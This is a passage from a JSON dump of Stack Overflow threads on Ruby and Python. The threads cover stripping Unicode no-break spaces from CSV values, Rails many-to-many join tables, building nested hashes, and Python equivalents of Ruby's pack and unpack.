"https://i.stack.imgur.com/UL3LT.jpg?s=128&g=1", "display_name": "Rubyx", "link": "https://stackoverflow.com/users/5143565/rubyx"}, "reply_to_user": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558518514, "post_id": 56253652, "comment_id": 99125000, "body": "@spickermann I just update my question"}], "answers": [{"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 2, "last_activity_date": 1558518348, "creation_date": 1558518348, "answer_id": 56253932, "question_id": 56253652, "link": "https://stackoverflow.com/questions/56253652/remove-whitespace-from-csv-row/56253932#56253932", "title": "Remove whitespace from CSV row", "body": "<p>The thing is those are <strong>not normal spaces</strong> but rather <a href=\"https://unicode-table.com/en/202F/\" rel=\"nofollow noreferrer\">Narrow No-Break Spaces</a>:</p>\n\n<pre><code>require 'csv'\nCSV.foreach('/tmp/test.csv') do |row|\n    puts row[0].delete \"\\u202f\"\nend\n#\u21d2 60500\n#  8100\n#  5400\n#  480\n</code></pre>\n\n<p>You can strip out <em>all the spaces</em>, including unicode ones, by using <a href=\"https://ruby-doc.org/core-2.6.3/Regexp.html#class-Regexp-label-Character+Properties\" rel=\"nofollow noreferrer\"><code>\\p{Space}</code> matcher</a>.</p>\n\n<pre><code>require 'csv'\nCSV.foreach('/tmp/test.csv') do |row|\n    puts row[0].gsub /\\p{Space}/, ''\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 606, "user_id": 5143565, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/UL3LT.jpg?s=128&g=1", "display_name": "Rubyx", "link": "https://stackoverflow.com/users/5143565/rubyx"}, "edited": false, "score": 0, "creation_date": 1558518648, "post_id": 56253949, "comment_id": 99125062, "body": "thank you I didn&#39;t knwo! I will read different unicode spaces"}], "tags": [], "owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "is_accepted": true, "score": 3, "last_activity_date": 1558518404, "creation_date": 1558518404, "answer_id": 56253949, "question_id": 56253652, "link": "https://stackoverflow.com/questions/56253652/remove-whitespace-from-csv-row/56253949#56253949", "title": "Remove whitespace from CSV row", "body": "<p>Your <code>test.csv</code> file contains <a href=\"https://www.fileformat.info/info/unicode/char/202f/index.htm\" rel=\"nofollow noreferrer\">narrow no-break space</a> (U+202F) unicode characters. This is a <em>non-whitespace</em> character. (A regular space character is U+0020.)</p>\n\n<p>You can see the different possible unicode spaces here: <a href=\"http://jkorpela.fi/chars/spaces.html\" rel=\"nofollow noreferrer\">http://jkorpela.fi/chars/spaces.html</a></p>\n\n<p>Here is a more generic script - using a <a href=\"https://www.regular-expressions.info/posixbrackets.html\" rel=\"nofollow noreferrer\">POSIX bracket group</a> - to remove all \"space-like\" characters:</p>\n\n<pre><code>require 'csv'\nCSV.foreach('test.csv') do |row|\n  row = row[0]\n  row = row.gsub(/[[:space:]]/,\"\")\n  puts row\nend\n</code></pre>\n"}], "owner": {"reputation": 606, "user_id": 5143565, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/UL3LT.jpg?s=128&g=1", "display_name": "Rubyx", "link": "https://stackoverflow.com/users/5143565/rubyx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 240, "favorite_count": 0, "accepted_answer_id": 56253949, "answer_count": 2, "score": 0, "last_activity_date": 1558518480, "creation_date": 1558517561, "last_edit_date": 1558518480, "question_id": 56253652, "link": "https://stackoverflow.com/questions/56253652/remove-whitespace-from-csv-row", "title": "Remove whitespace from CSV row", "body": "<p>I need to remove or stripe white space from CSV rows.</p>\n\n<p>test.csv</p>\n\n<pre><code>60\u202f500, # want 60500\n8\u202f100, # want 8100\n5\u202f400, # want 5400\n480, # want 480\n</code></pre>\n\n<p>remove_space.rb</p>\n\n<pre><code>require 'csv'\nCSV.foreach('test.csv') do |row|\n    row = row[0]\n    row = row.strip\n    row = row.gsub(\" \",\"\")\n    puts row\nend\n</code></pre>\n\n<p>I don't understand why it doesn't work. Result is same as test.csv</p>\n\n<p>Any idea?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 145, "user_id": 8229753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/22660980995e03dfd59812c9acf93db8?s=128&d=identicon&r=PG&f=1", "display_name": "Ketan Mangukiya", "link": "https://stackoverflow.com/users/8229753/ketan-mangukiya"}, "edited": false, "score": 0, "creation_date": 1558513791, "post_id": 56252325, "comment_id": 99122254, "body": "you mean that in coutryid column you want array of countryid?"}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1558513950, "post_id": 56252325, "comment_id": 99122347, "body": "If a user can have more than a country, you need a join table. See has many through."}, {"owner": {"reputation": 1306, "user_id": 8008340, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/15JhO.jpg?s=128&g=1", "display_name": "Konstantin Strukov", "link": "https://stackoverflow.com/users/8008340/konstantin-strukov"}, "edited": false, "score": 0, "creation_date": 1558514163, "post_id": 56252325, "comment_id": 99122471, "body": "Usually (by default) many-to-many in Rails is implemented via intermediate join table - see <a href=\"https://guides.rubyonrails.org/association_basics.html#the-has-and-belongs-to-many-association\" rel=\"nofollow noreferrer\">guides.rubyonrails.org/&hellip;</a> for details. It is theoretically possible to do it via embedding (keeping an array of ids for example), but this way has numerous disadvantages and goes against conventions so it might (and will) be painful to maintain with Rails."}, {"owner": {"reputation": 29, "user_id": 11368905, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/y8b75.png?s=128&g=1", "display_name": "landy", "link": "https://stackoverflow.com/users/11368905/landy"}, "edited": false, "score": 0, "creation_date": 1558514414, "post_id": 56252325, "comment_id": 99122595, "body": "Sorry for my unclear description. I use &#39;has_and_belongs_to_many :users&#39; in country model and so as user model. I also create &#39;country_user&#39; table following guide &#39;<a href=\"https://guides.rubyonrails.org/association_basics.html\" rel=\"nofollow noreferrer\">guides.rubyonrails.org/association_basics.html</a>&#39; . I want to make multiple values for &#39;countryid&#39; in user table. Is it possible to use &#39;rails c&#39;? I think it is about adding array into one column. thanks!"}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 11368905, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/y8b75.png?s=128&g=1", "display_name": "landy", "link": "https://stackoverflow.com/users/11368905/landy"}, "edited": false, "score": 0, "creation_date": 1558515996, "post_id": 56252843, "comment_id": 99123517, "body": "Thank you for clear reply. My understanding is: I misuse parent-child relationship and joint table. if country and user tables are both child tables, I can use a joint table like &#39;countries_users&#39; to record all their relationships. If I make user table as a parent table and country table as a child table, I cannot use joint table. But I can add &quot;countryid&quot; column to user table(parent table) and add multiple country id as an array in it. Is my understanding correct?"}, {"owner": {"reputation": 145, "user_id": 8229753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/22660980995e03dfd59812c9acf93db8?s=128&d=identicon&r=PG&f=1", "display_name": "Ketan Mangukiya", "link": "https://stackoverflow.com/users/8229753/ketan-mangukiya"}, "edited": false, "score": 0, "creation_date": 1558517808, "post_id": 56252843, "comment_id": 99124610, "body": "Did not get you propery, you want Array of Contry id in User table?"}, {"owner": {"reputation": 29, "user_id": 11368905, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/y8b75.png?s=128&g=1", "display_name": "landy", "link": "https://stackoverflow.com/users/11368905/landy"}, "edited": false, "score": 0, "creation_date": 1558522512, "post_id": 56252843, "comment_id": 99127215, "body": "Yep! I know I need to set column as &#39;array: true&#39; according to &#39;<a href=\"https://stackoverflow.com/questions/20937792/rails-adding-migration-to-add-an-array-default-empty\" title=\"rails adding migration to add an array default empty\">stackoverflow.com/questions/20937792/&hellip;</a>&#39;. But how to add integer array into table by using rails c?"}, {"owner": {"reputation": 4216, "user_id": 9269043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3a2763bcfa8917a365c88f8639494de7?s=128&d=identicon&r=PG", "display_name": "Vasilisa", "link": "https://stackoverflow.com/users/9269043/vasilisa"}, "reply_to_user": {"reputation": 29, "user_id": 11368905, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/y8b75.png?s=128&g=1", "display_name": "landy", "link": "https://stackoverflow.com/users/11368905/landy"}, "edited": false, "score": 0, "creation_date": 1559016942, "post_id": 56252843, "comment_id": 99275979, "body": "@landy, you don&#39;t need <code>country_id</code> column in <code>users</code> table at all, you only need a joint table here. With it you can query <code>User.first.countries</code> and get all countries for first user"}], "tags": [], "owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "is_accepted": false, "score": 1, "last_activity_date": 1558515058, "creation_date": 1558515058, "answer_id": 56252843, "question_id": 56252325, "link": "https://stackoverflow.com/questions/56252325/how-to-add-multiple-values-to-one-column-by-using-rails-console/56252843#56252843", "title": "How to add multiple values to one column by using rails console", "body": "<p>You're misunderstanding how the relationships are stored in your database.</p>\n\n<p>If you assign an object a parent_id, in your case a country ID, it can only ever have one of these, meaning it can't be used for 'has_and_belongs_to_many' relationships.</p>\n\n<p>You say you've made a join table which should be called country_users (or user_countries). Each of these records will have a country ID and a user ID, which establishes a link between those two records. If you want to establish a relationship like this in console, try:</p>\n\n<pre><code>country = Country.find(2)\nuser = User.find(1)\nuser.countries &lt;&lt; country\n</code></pre>\n\n<p>This will create a new record in your join table, with a User ID of 1 and a country ID of 2, and mean when you call <code>user.countries</code> it will include the one you just assigned.</p>\n"}], "owner": {"reputation": 29, "user_id": 11368905, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/y8b75.png?s=128&g=1", "display_name": "landy", "link": "https://stackoverflow.com/users/11368905/landy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 439, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1559016801, "creation_date": 1558513347, "last_edit_date": 1559016801, "question_id": 56252325, "link": "https://stackoverflow.com/questions/56252325/how-to-add-multiple-values-to-one-column-by-using-rails-console", "title": "How to add multiple values to one column by using rails console", "body": "<p>A small question about rails console. I am using Ruby 2.6.0, Rails 5.2.3. I created a <code>countries</code> table and a <code>users</code> table. </p>\n\n<p>I use <code>has_and_belongs_to_many :users</code> in the Country model and <code>has_and_belongs_to_many :countries</code> in the User model. I also created <code>country_users</code> table following the <a href=\"https://guides.rubyonrails.org/association_basics.html\" rel=\"nofollow noreferrer\">guide</a>. I want to make multiple values for <code>country_id</code> in <code>users</code> table. I think it is about adding array into one column. </p>\n\n<p>I already have two records in <code>users</code> table. I want to know how can I use <code>rails c</code> to add more values to <code>country_id</code> column in <code>users</code> table.</p>\n\n<p>Example:\nTwo records I had in <code>users</code> table:</p>\n\n<pre><code>    &lt;User id: 1, email: \"test01@france.com\", created_at: \"2019-05-21 12:36:08\", updated_at: \"2019-05-21 12:49:08\",countryid: 1, regionid: 1&gt;\n    &lt;User id: 2, email: \"test02@france.com\", created_at: \"2019-05-21 12:36:18\", updated_at: \"2019-05-21 12:49:28\",countryid: 2, regionid: 2&gt;\n</code></pre>\n\n<p>How to add '2' into <code>country_id</code> column for first user via console?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 3888, "user_id": 1294585, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/gkE1G.jpg?s=128&g=1", "display_name": "shrikant1712", "link": "https://stackoverflow.com/users/1294585/shrikant1712"}, "edited": false, "score": 0, "creation_date": 1558506426, "post_id": 56250363, "comment_id": 99118507, "body": "Can you please add your tried solutions"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558506554, "post_id": 56250363, "comment_id": 99118567, "body": "Your JSON is malformed."}, {"owner": {"reputation": 1458, "user_id": 4230220, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-M6gI9NNnr0k/AAAAAAAAAAI/AAAAAAAAAB8/8quus1Eouio/photo.jpg?sz=128", "display_name": "Dani Vijay", "link": "https://stackoverflow.com/users/4230220/dani-vijay"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558507094, "post_id": 56250363, "comment_id": 99118811, "body": "@AlekseiMatiushkin actually it is an array of objects, just corrected it"}], "answers": [{"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 2, "last_activity_date": 1558509575, "last_edit_date": 1558509575, "creation_date": 1558507430, "answer_id": 56250782, "question_id": 56250363, "link": "https://stackoverflow.com/questions/56250363/create-a-deep-nested-hash-using-loops-in-ruby/56250782#56250782", "title": "Create a deep nested hash using loops in Ruby", "body": "<p>Assuming you want to preserve the references (unlike in your desired output,) here you go:</p>\n\n<pre><code>elements = [\n  {\n    year: '2018',\n    items: [\n      {name: 'name1', value: 'value1', type: 'type1'},\n      {name: 'name2', value: 'value2', type: 'type2'}\n    ]\n},\n{\n    year: '2019',\n    items: [\n      {name: 'name3', value: 'value3', type: 'type2'},\n      {name: 'name4', value: 'value4', type: 'type1'}\n    ]\n  }\n]\n</code></pre>\n\n<p>Just iterate over everything and reduce into the hash. On the structures of known shape is\u2019s a trivial task:</p>\n\n<pre><code>elements.each_with_object(\n    Hash.new { |h, k| h[k] = Hash.new(&amp;h.default_proc) } # for deep bury\n) do |h, acc|\n  h[:items].each do |item|\n    acc[item[:type]][item[:name]][h[:year]] = item[:value]\n  end\nend\n\n#\u21d2\u00a0{\"type1\"=&gt;{\"name1\"=&gt;{\"2018\"=&gt;\"value1\"},\n#             \"name4\"=&gt;{\"2019\"=&gt;\"value4\"}},\n#   \"type2\"=&gt;{\"name2\"=&gt;{\"2018\"=&gt;\"value2\"},\n#             \"name3\"=&gt;{\"2019\"=&gt;\"value3\"}}}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 2, "creation_date": 1558509434, "post_id": 56251076, "comment_id": 99119922, "body": "Good one! I wonder when will we have <code>Hash#bury</code> or like to avoid this ugly fence <code>{=&gt;{=&gt;{=&gt;{=&gt;</code> :)"}, {"owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 2, "creation_date": 1558510134, "post_id": 56251076, "comment_id": 99120343, "body": "@AlekseiMatiushkin: <code>class Hash; def bury(*keys, val); keys.size &gt; 1 ? self.dig(*keys[0..-2])[keys[-1]] = val : self[keys.first] = val; end; end</code> (the hash better be autovivifying, though, or it won&#39;t be too useful),"}], "tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 4, "last_activity_date": 1558509462, "last_edit_date": 1558509462, "creation_date": 1558508652, "answer_id": 56251076, "question_id": 56250363, "link": "https://stackoverflow.com/questions/56250363/create-a-deep-nested-hash-using-loops-in-ruby/56251076#56251076", "title": "Create a deep nested hash using loops in Ruby", "body": "<pre><code>elements.each_with_object({}) { |g,h| g[:items].each { |f|\n    h.update(f[:type]=&gt;{ f[:name]=&gt;{ g[:year]=&gt;f[:value] } }) { |_,o,n| o.merge(n) } } }\n  #=&gt; {\"type1\"=&gt;{\"name1\"=&gt;{\"2018\"=&gt;\"value1\"}, \"name4\"=&gt;{\"2019\"=&gt;\"value4\"}},\n  #    \"type2\"=&gt;{\"name2\"=&gt;{\"2018\"=&gt;\"value2\"}, \"name3\"=&gt;{\"2019\"=&gt;\"value3\"}}} \n</code></pre>\n\n<p>This uses the form of <a href=\"http://ruby-doc.org/core-2.5.1/Hash.html#method-i-update\" rel=\"nofollow noreferrer\">Hash#update</a> (aka <code>merge!</code>) that employs a block (here <code>{ |_,o,n| o.merge(n) }</code> to determine the values of keys that are present in both hashes being merged. See the doc for definitions of the three block variables (here <code>_</code>, <code>o</code> and <code>n</code>). Note that in performing <code>o.merge(n)</code> <code>o</code> and <code>n</code> will have no common keys, so a block is not needed for that operation.</p>\n"}], "owner": {"reputation": 1458, "user_id": 4230220, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-M6gI9NNnr0k/AAAAAAAAAAI/AAAAAAAAAB8/8quus1Eouio/photo.jpg?sz=128", "display_name": "Dani Vijay", "link": "https://stackoverflow.com/users/4230220/dani-vijay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 442, "favorite_count": 0, "accepted_answer_id": 56250782, "answer_count": 2, "score": 0, "last_activity_date": 1558517064, "creation_date": 1558505568, "last_edit_date": 1558517064, "question_id": 56250363, "link": "https://stackoverflow.com/questions/56250363/create-a-deep-nested-hash-using-loops-in-ruby", "title": "Create a deep nested hash using loops in Ruby", "body": "<p>I want to create a nested hash using four values <code>type</code>, <code>name</code>, <code>year</code>, <code>value</code>. ie, key of the first hash will be <code>type</code>, value will be another hash with key <code>name</code>, then value of that one will be another hash with key <code>year</code> and value as <code>value</code>.</p>\n\n<p>The array of objects I'm iterating looks like this:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>elements = [\n    {\n        year: '2018',\n        items: [\n            {\n                name: 'name1',\n                value: 'value1',\n                type: 'type1',\n            },\n            {\n                name: 'name2',\n                value: 'value2',\n                type: 'type2',\n            },\n        ]\n    },\n    {\n        year: '2019',\n        items: [\n            {\n                name: 'name3',\n                value: 'value3',\n                type: 'type2',\n            },\n            {\n                name: 'name4',\n                value: 'value4',\n                type: 'type1',\n            },\n        ]\n    }\n]\n</code></pre>\n\n<p>And I'm getting all values together using two loops like this:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>elements.each do |element|\n    year = element.year\n    element.items.each |item|\n        name = item.name\n        value = item.value\n        type = item.type\n\n        # TODO: create nested hash\n    end\nend\n</code></pre>\n\n<p>Expected output is like this:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>{\n    \"type1\" =&gt; {\n        \"name1\" =&gt; {\n            \"2018\" =&gt; \"value1\"\n        },\n        \"name4\" =&gt; {\n            \"2019\" =&gt; \"value4\"\n        }\n    },\n    \"type2\" =&gt; {\n        \"name2\" =&gt; {\n            \"2018\" =&gt; \"value2\"\n        },\n        \"name3\" =&gt; {\n            \"2019\" =&gt; \"value3\"\n        }\n    }\n}\n</code></pre>\n\n<p>I tried out some methods but it doesn't seems to work out as expected. How can I do this?</p>\n"}, {"tags": ["python", "ruby"], "comments": [{"owner": {"reputation": 35644, "user_id": 4954037, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/YOM4r.jpg?s=128&g=1", "display_name": "hiro protagonist", "link": "https://stackoverflow.com/users/4954037/hiro-protagonist"}, "edited": false, "score": 1, "creation_date": 1558502548, "post_id": 56249751, "comment_id": 99117067, "body": "and what does <code>[&quot;037fea0651b358c361de&quot;].pack(&quot;H*&quot;)</code> do in ruby? (for us ignorants...)"}, {"owner": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "edited": false, "score": 0, "creation_date": 1558516367, "post_id": 56249751, "comment_id": 99123737, "body": "How about a link to pack/unpack APIdoc?"}, {"owner": {"reputation": 1611, "user_id": 7526319, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aUMpl.jpg?s=128&g=1", "display_name": "Sajuuk", "link": "https://stackoverflow.com/users/7526319/sajuuk"}, "reply_to_user": {"reputation": 7224, "user_id": 448934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TXtux.jpg?s=128&g=1", "display_name": "Pascal", "link": "https://stackoverflow.com/users/448934/pascal"}, "edited": false, "score": 0, "creation_date": 1558516534, "post_id": 56249751, "comment_id": 99123859, "body": "@pascalbetz added api doc for them in ruby."}], "answers": [{"tags": [], "owner": {"reputation": 23130, "user_id": 8586227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BRnwg.png?s=128&g=1", "display_name": "Davis Herring", "link": "https://stackoverflow.com/users/8586227/davis-herring"}, "is_accepted": false, "score": 2, "last_activity_date": 1558529995, "last_edit_date": 1558529995, "creation_date": 1558502735, "answer_id": 56249820, "question_id": 56249751, "link": "https://stackoverflow.com/questions/56249751/python-version-for-rubys-array-pack-and-unpack/56249820#56249820", "title": "Python Version for Ruby&#39;s array.pack() and unpack()?", "body": "<p><code>struct</code> does only fixed-width encodings that correspond to a <strong>memory dump</strong> of something like a C struct.  You want <a href=\"https://docs.python.org/3/library/stdtypes.html#bytes.fromhex\" rel=\"nofollow noreferrer\"><code>bytes.fromhex</code></a> or <a href=\"https://docs.python.org/3/library/binascii.html#binascii.a2b_hex\" rel=\"nofollow noreferrer\"><code>binascii.unhexlify</code></a>, depending on the source type (which is never a list).</p>\n\n<p>After any such conversion, you <strong>can</strong> use <a href=\"https://docs.python.org/3/library/struct.html#struct.unpack\" rel=\"nofollow noreferrer\"><code>struct.unpack</code></a> on a byte string containing <strong>any number</strong> of \u201crecords\u201d corresponding to the format string; each is decoded into an element of the returned tuple.  The format string supports the usual integer sizes and endianness choices; it is of course possible to construct a format <strong>dynamically</strong> to do things like read a matrix whose dimensions are chosen at runtime:</p>\n\n<pre><code>mat=struct.unpack(\"%dd\"%cols,buf)  # rows determined from len(buf)\n</code></pre>\n\n<p>It\u2019s also possible to construct a <strong>lower-memory</strong> <a href=\"https://docs.python.org/3/library/array.html#array.array\" rel=\"nofollow noreferrer\"><code>array</code></a> if the element type is <strong>primitive</strong>; then you can follow up with <code>byteswap</code> as <a href=\"https://stackoverflow.com/a/56249842/8586227\">Alec A mentioned</a>.  NumPy offers <a href=\"https://docs.scipy.org/doc/numpy/reference/generated/numpy.frombuffer.html\" rel=\"nofollow noreferrer\">similar facilities</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 35644, "user_id": 4954037, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/YOM4r.jpg?s=128&g=1", "display_name": "hiro protagonist", "link": "https://stackoverflow.com/users/4954037/hiro-protagonist"}, "is_accepted": false, "score": 2, "last_activity_date": 1558502754, "creation_date": 1558502754, "answer_id": 56249822, "question_id": 56249751, "link": "https://stackoverflow.com/questions/56249751/python-version-for-rubys-array-pack-and-unpack/56249822#56249822", "title": "Python Version for Ruby&#39;s array.pack() and unpack()?", "body": "<p>for a string in the utf-8 range it would be:</p>\n\n<pre><code>from binascii import unhexlify\n\nstrg = \"464F4F\"\nunhexlify(strg).decode()  # FOO  (str)\n</code></pre>\n\n<p>if your content is just binary</p>\n\n<pre><code>strg = \"037fea0651b358c361de\"\nunhexlify(strg) # b'\\x03\\x7f\\xea\\x06Q\\xb3X\\xc3a\\xde'  (bytes)\n</code></pre>\n\n<p>also <code>bytes.fromhex</code> (as in <a href=\"https://stackoverflow.com/a/56249820/4954037\">Davis Herring's answer</a>) may be worth checking out.</p>\n"}, {"comments": [{"owner": {"reputation": 1611, "user_id": 7526319, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aUMpl.jpg?s=128&g=1", "display_name": "Sajuuk", "link": "https://stackoverflow.com/users/7526319/sajuuk"}, "edited": false, "score": 0, "creation_date": 1558509996, "post_id": 56249842, "comment_id": 99120255, "body": "actually I was looking for more than just <code>pack(&quot;H*&quot;), also </code>pack(&quot;S&gt;&quot;)`.  or shall I say I&#39;m looking for a function as versatile as arr.pack,  but that&#39;s another story..."}], "tags": [], "owner": {"reputation": 6521, "user_id": 7583953, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/w0Jkd.jpg?s=128&g=1", "display_name": "Alec", "link": "https://stackoverflow.com/users/7583953/alec"}, "is_accepted": false, "score": 1, "last_activity_date": 1558502831, "creation_date": 1558502831, "answer_id": 56249842, "question_id": 56249751, "link": "https://stackoverflow.com/questions/56249751/python-version-for-rubys-array-pack-and-unpack/56249842#56249842", "title": "Python Version for Ruby&#39;s array.pack() and unpack()?", "body": "<p>Try <a href=\"https://docs.python.org/3/library/stdtypes.html#memoryview.cast\" rel=\"nofollow noreferrer\"><code>memoryview.cast</code></a>, which allows you to change the endianness of an array or byte object.</p>\n\n<p>Storing values as <a href=\"https://docs.python.org/3/library/array.html#module-array\" rel=\"nofollow noreferrer\">arrays</a> makes things easier, as you can use the <code>byteswap</code> function.</p>\n"}], "owner": {"reputation": 1611, "user_id": 7526319, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/aUMpl.jpg?s=128&g=1", "display_name": "Sajuuk", "link": "https://stackoverflow.com/users/7526319/sajuuk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 330, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1558529995, "creation_date": 1558502360, "last_edit_date": 1558522661, "question_id": 56249751, "link": "https://stackoverflow.com/questions/56249751/python-version-for-rubys-array-pack-and-unpack", "title": "Python Version for Ruby&#39;s array.pack() and unpack()?", "body": "<p>In Ruby, I could easily pack an array representing some sequence into a binary string:</p>\n\n<pre><code># for int\n# \"S*!\" directive means format for 16-bit int, and using native endianess\n\n# 16-bit int, so each digit was represented by two bytes. \"\\x01\\x00\" and \"\\x02\\x00\"\n# here the native endianess is \"little endian\", so you should \n# look at it backwards, \"\\x01\\x00\" becomes 0001, and \"\\x02\\x00\" becomes 0002\n\n\"\\x01\\x00\\x02\\x00\".unpack(\"S!*\")\n# [1, 2]\n\n\n# for hex\n# \"H*\" means every element in the array is a digit for the hexstream\n\n[\"037fea0651b358c361de\"].pack(\"H*\")\n# \"\\x03\\x7F\\xEA\\x06Q\\xB3X\\xC3a\\xDE\"\n</code></pre>\n\n<p>API doc for <a href=\"http://ruby-doc.org/core-2.6.3/Array.html#method-i-pack\" rel=\"nofollow noreferrer\">pack</a> and <a href=\"http://ruby-doc.org/core-2.6.3/String.html#method-i-unpack\" rel=\"nofollow noreferrer\">unpack</a>.</p>\n\n<p>I couldn't find an uniform and equivalent way of transforming sequence to bytes (or vice versa) in python. </p>\n\n<p>While <a href=\"https://docs.python.org/3/library/struct.html\" rel=\"nofollow noreferrer\"><code>struct</code></a> provides methods for packing into bytes objects, the <a href=\"https://docs.python.org/3/library/struct.html#struct-format-strings\" rel=\"nofollow noreferrer\">format string</a> available has no option for hexstream.</p>\n\n<p>EDIT: What I really want is something as versatile as Ruby's arr.pack and str.unpack, which supports multiple formatting and endianess control.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "thread-safety", "singleton"], "answers": [{"comments": [{"owner": {"reputation": 2510, "user_id": 2995613, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/3eb082f2910fcc8ebc7bb2f5ce5bc9ce?s=128&d=identicon&r=PG", "display_name": "Daniel", "link": "https://stackoverflow.com/users/2995613/daniel"}, "edited": false, "score": 0, "creation_date": 1558497755, "post_id": 56248920, "comment_id": 99116033, "body": "It makes sense. But does it have any advantage concerning my initial approach? Would this <code>salesforce_client</code> be thread-safe?"}, {"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "reply_to_user": {"reputation": 2510, "user_id": 2995613, "user_type": "registered", "accept_rate": 